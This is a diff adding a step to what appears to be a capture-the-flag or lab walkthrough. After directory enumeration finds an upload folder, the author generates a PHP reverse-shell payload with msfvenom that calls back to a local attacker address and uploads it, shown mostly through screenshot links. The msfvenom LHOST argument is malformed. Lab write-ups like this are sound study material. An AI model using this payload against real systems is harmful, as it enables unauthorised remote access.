@@ -44,6 +44,21 @@ gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-l
 ![image](https://github.com/user-attachments/assets/4cb06ba9-d0a3-44d3-8c88-542e7cafb43e)
 ![image](https://github.com/user-attachments/assets/b99a440d-9023-4202-9584-f063d335b13a)
 
+As we can see we find the destination where our files are stored, so if we can upload a malicious file to get a revershell we could have access to the machine.
+```bash
+msfvenom -p php/reverse_php LHOST=192.168.1.228=443 -f raw >ARCHIVO_NEW.php
+```
+![image](https://github.com/user-attachments/assets/7492d350-4877-40bd-a8f8-109315f00545)
+![image](https://github.com/user-attachments/assets/c313d3ae-14aa-4676-8aca-9f3daedcb7fd)
+
+We will upload our malicious file
+
+![image](https://github.com/user-attachments/assets/76debd5b-3d09-4248-b8be-841cb1454b39)
+![image](https://github.com/user-attachments/assets/608e6707-f2fd-49b9-a47e-3f74d27c12b6)
+
+
+
+
 
 
 
